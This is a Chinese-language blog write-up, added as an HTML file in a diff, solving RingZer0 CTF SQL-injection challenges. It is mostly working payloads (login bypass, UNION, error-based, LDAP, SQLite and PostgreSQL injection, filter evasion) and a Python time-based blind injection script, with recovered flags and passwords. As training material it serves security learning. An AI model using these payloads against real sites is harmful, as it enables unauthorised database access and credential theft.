@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      RingZer0_CTF_web-sql WP | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>RingZer0_CTF_web-sql WP</h2>
+  <p class="post-date">2019-04-06 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>sql Injection训练地址<a href="https://ringzer0ctf.com/challenges" target="_blank" rel="noopener">https://ringzer0ctf.com/challenges</a></p>
+<h1 id="Challenge-1-Bypass-me-if-you-can-（万能密码）"><a href="#Challenge-1-Bypass-me-if-you-can-（万能密码）" class="headerlink" title="Challenge 1 Bypass me if you can （万能密码）"></a>Challenge 1 Bypass me if you can （万能密码）</h1><p>尝试 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin’#</span><br><span class="line">password:1</span><br></pre></td></tr></table></figure>
+<p><img src="./1.png" alt=""> </p>
+<h1 id="Challenge-Access-list-（报错-联合）"><a href="#Challenge-Access-list-（报错-联合）" class="headerlink" title="Challenge Access list （报错+联合）"></a>Challenge Access list （报错+联合）</h1><p><img src="./2.png" alt=""></p>
+<p><strong>引号报错，使用报错注入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">username&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br><span class="line">XPATH syntax error: &#39;~chal2~&#39;</span><br><span class="line"></span><br><span class="line">表名字</span><br><span class="line">username&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;chal2&#39;),0x7e))#</span><br><span class="line">XPATH syntax error: &#39;~c2_group,c2_group_membership,c2&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;c2_group_membership&#39;),0x7e))#</span><br><span class="line">XPATH syntax error: &#39;~id,usernameid,groupnameid~&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;c2_group&#39;),0x7e))#</span><br><span class="line">XPATH syntax error: &#39;~id,groupname,description~&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&#39; union select 1,2,group_concat(description) from c2_group#</span><br><span class="line">Administrateurs,Users,FLAG-sdfoip340e89rfuj34woit</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Login-portal-1-like注入"><a href="#Login-portal-1-like注入" class="headerlink" title="Login portal 1(like注入)"></a>Login portal 1(like注入)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Paload:username&#x3D;admin &#39;%20or%20username%20like%20&#39;%&amp;password&#x3D;123</span><br><span class="line">username&#x3D;admin&#39;  or 1 like &#39;1&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<p>%换成_也是ok</p>
+<p><code>FLAG-4f885o1dal0q1huj6eaxuatcvn</code><br><img src="./3.png" alt=""><br><img src="./4.png" alt=""></p>
+<h1 id="Random-Login-Form（长度截断）"><a href="#Random-Login-Form（长度截断）" class="headerlink" title="Random Login Form（长度截断）"></a>Random Login Form（长度截断）</h1><p>判断是二次注入但是字符无论输出输入都被转义<br>使用长度截断<br>注册：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username:admin                                   1</span><br><span class="line">Password:1</span><br></pre></td></tr></table></figure>
+
+<p>登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username:admin</span><br><span class="line">Password:1</span><br></pre></td></tr></table></figure>
+<p><code>FLAG-0Kg64o8M9gPQfH45583Mc0jc3u</code></p>
+<h1 id="Just-another-login-form-LDAP注入"><a href="#Just-another-login-form-LDAP注入" class="headerlink" title="Just another login form (LDAP注入)"></a>Just another login form (LDAP注入)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username:admin&#39; union select sha1(1),sha1(1)#</span><br><span class="line">Password:1</span><br></pre></td></tr></table></figure>
+
+
+<p>提示:Bad search filter<br>LDAP注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username:*</span><br><span class="line">Password:*</span><br></pre></td></tr></table></figure>
+
+
+<p><code>FLAG-38i65201RR4B5g1oAm05fHO0QP</code></p>
+<h1 id="Po-po-po-po-postgresql-postgresql注入"><a href="#Po-po-po-po-postgresql-postgresql注入" class="headerlink" title="Po po po po postgresql (postgresql注入)"></a>Po po po po postgresql (postgresql注入)</h1><p>Select * from users where (username=(‘’) and password=(’’))</p>
+<p>尝试: <code>admin’ or ‘a’ like ‘a’</code></p>
+<p><code>ERROR: syntax error at or near &quot;27e1&quot; LINE 1: ...me = (&#39;admin&#39; or &#39;a&#39; like &#39;a&#39;&#39;) AND password = (&#39;27e1fc1258... ^</code></p>
+<p>注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;) or &#39;a&#39; like &#39;a&#39;) -- &amp;password&#x3D;1</span><br><span class="line">username&#x3D;admin&#39;)) or &#39;a&#39; like &#39;a&#39; -- &amp;password&#x3D;1</span><br><span class="line">&#39;)) OR TRUE --</span><br></pre></td></tr></table></figure>
+
+<p><code>FLAG-mdeq68jNN88xLB1o2m8V33Ld</code><br>注意postsql中where子句只能用string值</p>
+<h1 id="Login-form-Don’t-mess-with-Noemie（POST注入）"><a href="#Login-form-Don’t-mess-with-Noemie（POST注入）" class="headerlink" title="Login form | Don’t mess with Noemie（POST注入）"></a>Login form | Don’t mess with Noemie（POST注入）</h1><p>尝试:<code>1’ or ‘a’ like ‘a</code><br>登入失败<br>猜测语句为 <code>select * from users where username=’xx’ and password=’xxx’</code></p>
+<p>使用语句：<code>&#39; or 1  or &#39;</code></p>
+<p><code>&#39; UNION SELECT 1,2&#39;</code></p>
+<p><code>FLAG-Yk3Hfovvb5kALU9hI2545MaY</code><br><img src="./5.png" alt=""></p>
+<h1 id="What’s-the-definition-of-NULL-（sqlite联合注入）"><a href="#What’s-the-definition-of-NULL-（sqlite联合注入）" class="headerlink" title="What’s the definition of NULL （sqlite联合注入）"></a>What’s the definition of NULL （sqlite联合注入）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;LTEpIFVOSU9OIEFMTCBTRUxFQ1QgbmFtZSxOVUxMLE5VTEwgRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIHR5cGU9InRhYmxlIi0t</span><br><span class="line">Plain:</span><br><span class="line">		-1) UNION ALL SELECT name,NULL,NULL FROM sqlite_master WHERE type&#x3D;&quot;table&quot;--</span><br><span class="line">Result:</span><br><span class="line">		Flag</span><br><span class="line">The number of rows:</span><br><span class="line">	?id&#x3D;LTEpIFVOSU9OIEFMTCBTRUxFQ1QgQ09VTlQoKiksTlVMTCxOVUxMIGZyb20gZmxhZy0t</span><br><span class="line">Plain:</span><br><span class="line">		-1) UNION ALL SELECT COUNT(*),NULL,NULL from flag--</span><br><span class="line">Result: 2</span><br><span class="line">The flag:</span><br><span class="line">	?id&#x3D;LTEpIFVOSU9OIEFMTCBTRUxFQ1QgKiBmcm9tIGZsYWcgTElNSVQgMSBPRkZTRVQgMS0t  </span><br><span class="line">Plain: </span><br><span class="line">		-1) UNION ALL SELECT * from flag LIMIT 1 OFFSET 1--</span><br><span class="line">Result: </span><br><span class="line">		FLAG-sQFYzqfxbZhAj04NyCCV8tqA</span><br></pre></td></tr></table></figure>
+
+<p><img src="./6.png" alt=""></p>
+<h1 id="Login-portal-2-（sha1注入）"><a href="#Login-portal-2-（sha1注入）" class="headerlink" title="Login portal 2 （sha1注入）"></a>Login portal 2 （sha1注入）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username:1’ or username like “%”#</span><br><span class="line">Password:1</span><br></pre></td></tr></table></figure>
+<p>可得username为impossibletoguess<br><img src="./7.png" alt=""></p>
+<p>使用联合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input username: 1&#39; union select database(),2#              </span><br><span class="line">Input password: 1</span><br></pre></td></tr></table></figure>
+<p>Database为login2<br><img src="./8.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input username: 1&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line">Input password: 1</span><br></pre></td></tr></table></figure>
+<p>表名为users<br><img src="./9.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input username: 1&#39; union select password,2 from users#</span><br><span class="line">Input password: 2</span><br></pre></td></tr></table></figure>
+<p>可知password 通过sha1加密<br><img src="./10.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input username: 1&#39; union select sha1(1),sha1(1)#</span><br><span class="line">Input password: 1</span><br></pre></td></tr></table></figure>
+<p>FLAG-wlez73yxtkae9mpr8aerqay7or<br><img src="./11.png" alt=""><br><img src="./12.png" alt=""></p>
+<h1 id="Generate-random-quote-GET-过滤空格引号"><a href="#Generate-random-quote-GET-过滤空格引号" class="headerlink" title="Generate random quote (GET,过滤空格引号)"></a>Generate random quote (GET,过滤空格引号)</h1><p>空格被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;37?q&#x3D;2%0Aunion%0Aselect%0A1,database()#正常查数据库名字</span><br><span class="line">Quote of the day: No one forgives with more grace and love than a child.</span><br><span class="line">Quote of the day: sqli_quote</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查表名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;37?q&#x3D;2%0Aunion%0Aselect%0A1,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema&#x3D;database())#</span><br><span class="line"></span><br><span class="line">Quote of the day: No one forgives with more grace and love than a child.</span><br><span class="line">Quote of the day: alkdjf4iu,quotes</span><br></pre></td></tr></table></figure>
+
+<p>查列名<br>Where语句中能将十六进制自动转换为字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;37?q&#x3D;2%0Aunion%0Aselect%0A1,(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name&#x3D;0x616c6b646a66346975)#</span><br><span class="line"></span><br><span class="line">Quote of the day: No one forgives with more grace and love than a child.</span><br><span class="line">Quote of the day: id,flag</span><br></pre></td></tr></table></figure>
+
+
+<p>查flag<br><code>https://ringzer0ctf.com/challenges/37?q=2%0Aunion%0Aselect%0A1,(select%0Agroup_concat(flag)%0Afrom%0Aalkdjf4iu)#</code></p>
+<h1 id="Matrix-Fan-The-only-limits-are-yours（GET，编码引号）"><a href="#Matrix-Fan-The-only-limits-are-yours（GET，编码引号）" class="headerlink" title="Matrix Fan? The only limits are yours（GET，编码引号）"></a>Matrix Fan? The only limits are yours（GET，编码引号）</h1><p>查询所有表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;39&#x2F;?id&#x3D;1%20Union%20select%20NULL,(SELECT%20name%20FROM%20sqlite_master%20WHERE%20type&#x3D;%27table%27)#</span><br><span class="line">Limit x,1;</span><br><span class="line">random_stuff</span><br><span class="line">ajklshfajks </span><br><span class="line">troll </span><br><span class="line">aatroll</span><br></pre></td></tr></table></figure>
+
+<p>查询表结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;39&#x2F;?id&#x3D;1%20Union%20select%20NULL,(SELECT%20sql%20FROM%20sqlite_master%20WHERE%20type&#x3D;%27table%27%20limit%201,1)#CREATE TABLE ajklshfajks (flag varchar(40))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE random_stuff (id int(10), content varchar(100)) </span><br><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;39&#x2F;?id&#x3D;1%20Union%20select%20NULL,(SELECT%20flag%20from%20ajklshfajks)#</span><br></pre></td></tr></table></figure>
+
+<h1 id="No-more-hacking-for-me-源代码泄露双重编码"><a href="#No-more-hacking-for-me-源代码泄露双重编码" class="headerlink" title="No more hacking for me! (源代码泄露双重编码)"></a>No more hacking for me! (源代码泄露双重编码)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urldecode(addslashes(str_replace(&quot;&#39;&quot;, &quot;&quot;, urldecode(htmlspecialchars($_GET[&#39;id&#39;], ENT_QUOTES)))))</span><br></pre></td></tr></table></figure>
+<p>利用双重urldecode绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;74&#x2F;?id&#x3D;0%252527%20union%20all%20select%201,tbl_name,3%20FROM%20sqlite_master%20WHERE%20type&#x3D;%252527table%252527%20%20limit%200,1%20--</span><br><span class="line"></span><br><span class="line">random_data</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;74&#x2F;?id&#x3D;0%252527%20union%20all%20select%201,sql,3%20FROM%20sqlite_master%20WHERE%20type&#x3D;%252527table%252527%20%20limit%200,1%20--</span><br><span class="line">CREATE TABLE random_data (id int, message varchar(50), display int)</span><br></pre></td></tr></table></figure>
+<h1 id="Don’t-Stumble-in-the-Process-（BOOL盲注）"><a href="#Don’t-Stumble-in-the-Process-（BOOL盲注）" class="headerlink" title="Don’t Stumble in the Process （BOOL盲注）"></a>Don’t Stumble in the Process （BOOL盲注）</h1><p>根据 1 or 1=2 1 and 1=2判断为Bool注入，且为整形<br><code>sqlmap -u &quot;http://challenges.ringzer0team.com:10291/?id=1*&quot;  --technique B --dbs</code><br><img src="./13.png" alt=""><br>但是爆不出东西来</p>
+<h1 id="Generate-random-quote-again-（双参数GET注入，转义字符）"><a href="#Generate-random-quote-again-（双参数GET注入，转义字符）" class="headerlink" title="Generate random quote again （双参数GET注入，转义字符）"></a>Generate random quote again （双参数GET注入，转义字符）</h1><p>有脑洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;38?q&#x3D;3\&amp;s&#x3D;ununionion%20select%201,2%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;38?q&#x3D;3\&amp;s&#x3D;ununionion%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())%23</span><br><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;38?q&#x3D;3\&amp;s&#x3D;ununionion%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x7164796b35)%23</span><br><span class="line">https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;38?q&#x3D;3\&amp;s&#x3D;ununionion%20select%201,(select%20flag%20from%20qdyk5)%23</span><br><span class="line">FLAG-enjlleb337u17K7yLqZ927F3</span><br></pre></td></tr></table></figure>
+
+<h2 id="老外wp"><a href="#老外wp" class="headerlink" title="老外wp"></a>老外wp</h2><p>猜测Sql语句为：<br><code>select id,quote from quotes where id=&quot;.htmlspecialchars($_GET[&#39;q&#39;]).&quot; and len(quote) &lt; &quot;.mysql_real_escape_string($_GET[&#39;s&#39;]).&quot; limit 1;</code></p>
+<p>可以总结为双条件，需要屏蔽这两个参数，转义其中一个引号，构造联合注入</p>
+<h1 id="Find-online-hot-single-Mom-（load-file注入）"><a href="#Find-online-hot-single-Mom-（load-file注入）" class="headerlink" title="Find online hot single Mom （load_file注入）"></a>Find online hot single Mom （load_file注入）</h1><p>Py跑太慢了,而且网页给挂了<br>参考链接<br><code>https://gist.github.com/h3xstream/3bc4f264cc911e37f0d6</code><br>思路为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.使用python得到password RSA加密后的密码</span><br><span class="line">2.Python 跑”select load_file(‘&#x2F;var&#x2F;www&#x2F;index.php’)”获取源代码</span><br><span class="line">3.根据index.php公钥文件路径取得公钥</span><br><span class="line">4.解密密码</span><br></pre></td></tr></table></figure>
+<p><img src="./14.png" alt=""></p>
+<h1 id="Login-portal-3-（POST-BOOL注入）"><a href="#Login-portal-3-（POST-BOOL注入）" class="headerlink" title="Login portal 3 （POST BOOL注入）"></a>Login portal 3 （POST BOOL注入）</h1><p><code>admin&#39; and 1=2 and &#39;1&#39;=&#39;1</code></p>
+<p><code>SQL1nj3ct10nFTW</code></p>
+<p>登录拿到flag：<code>FLAG-vgnvokjmi3fgx0s23iv5x8n2w2</code><br><img src="./15.png" alt=""></p>
+<h1 id="Lite-login-portal-sqlite盲注"><a href="#Lite-login-portal-sqlite盲注" class="headerlink" title="Lite login portal (sqlite盲注)"></a>Lite login portal (sqlite盲注)</h1><p>盲注脚本如下，没有ascii()函数，且=必须加引号</p>
+<p><img src="./16.png" alt=""><br><img src="./17.png" alt=""></p>
+<p>密码：<code>4dm1nzP455</code><br><code>FLAG-rL4t5LRMwjacD82G9vpAd6Gm</code></p>
+<h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><p>或者使用burpsuite增加效率<br><code>username=1&#39; or hex(substr(password, 1, 1)) = hex(&#39;§0§&#39;) -- &amp;password=zxasqw159</code><br><img src="./18.png" alt=""></p>
+<h1 id="Internet-As-A-Service-point-7-（-4-lt-0e1union拼接注入）"><a href="#Internet-As-A-Service-point-7-（-4-lt-0e1union拼接注入）" class="headerlink" title="Internet As A Service(point 7)（||4&lt;0e1union拼接注入）"></a>Internet As A Service(point 7)（||4&lt;0e1union拼接注入）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注入s&#x3D;’||’ring’||’显示三行</span><br><span class="line">注入s&#x3D;’||’ring’||’union’||’不显示，union被过滤</span><br><span class="line">注入s&#x3D;’||’ring’||’123union’||’,显示ring关键字查询，说明直接拼接union会被过滤</span><br></pre></td></tr></table></figure>
+<p><code>select * from users where id=&#39;-1&#39;||4&lt;0e1union select 1,2,3;</code></p>
+<p><img src="./19.png" alt=""></p>
+<p><code>?s=1&#39;||4&lt;3e0union%0Dall%0Dselect%0Dnull,null,flag%0Dfrom%0Drz_flag%23</code></p>
+<p><img src="./20.png" alt=""></p>
+<h1 id="Login-portal-4-（时间盲注）"><a href="#Login-portal-4-（时间盲注）" class="headerlink" title="Login portal 4 （时间盲注）"></a>Login portal 4 （时间盲注）</h1><p>本题没有明显的回显提示，使用时间盲注</p>
+<p><code>-1&#39; || if(1=2,sleep(5),1)#</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import string </span><br><span class="line">passwd&#x3D;&#39;&#39;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;6&quot;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">	for str1 in (string.ascii_letters+&#39;0123456789&#39;):</span><br><span class="line">		url&#x3D;&quot;https:&#x2F;&#x2F;ringzer0ctf.com&#x2F;challenges&#x2F;6&quot;</span><br><span class="line">		sql&#x3D;&quot;-1&#39; || if((substr((select password from users limit 0,1),&quot;+str(i)+&quot;,1)&#x3D;&quot;+&quot;&#39;&quot;+str1+&quot;&#39;)&quot;+&quot;,sleep(3),1)#&quot;</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">			&#39;username&#39;:sql,</span><br><span class="line">			&#39;password&#39;:&#39;123&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		cookie&#x3D;&#123;&#39;PHPSESSID&#39;:&#39;mg0m9djc25o1m1a5e0a61nv543&#39;&#125;</span><br><span class="line">		try:</span><br><span class="line">			print(sql)</span><br><span class="line">			r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,cookies&#x3D;cookie,timeout&#x3D;2.5)</span><br><span class="line"></span><br><span class="line">		except:</span><br><span class="line">			passwd&#x3D;passwd+str1</span><br><span class="line">			print(&#39;password: &#39;+passwd)</span><br><span class="line">			break</span><br><span class="line"># In [10]: string.ascii_letters</span><br><span class="line"># Out[10]: &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line"></span><br><span class="line"># In [11]: string.ascii_lowercase</span><br><span class="line"># Out[11]: &#39;abcdefghijklmnopqrstuvwxyz&#39;</span><br><span class="line"></span><br><span class="line"># In [12]: string.ascii_uppercase</span><br><span class="line"># Out[12]: &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line"></span><br><span class="line"># In [13]: string.digits</span><br><span class="line"># Out[13]: &#39;0123456789&#39;</span><br><span class="line"></span><br><span class="line"># In [14]: string.punctuation</span><br><span class="line"># Out[14]: &#39;!&quot;#$%&amp;\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^_&#96;&#123;|&#125;~&#39;</span><br><span class="line"></span><br><span class="line"># In [15]: string.whitespace</span><br><span class="line"># Out[15]: &#39;\t\n\x0b\x0c\r &#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到密码：<br><code>UrASQLi1337!</code></p>
+<p>登录后拿到flag<br><code>FLAG-70ygerntbicjdzrxmm0rmk0xx2</code></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
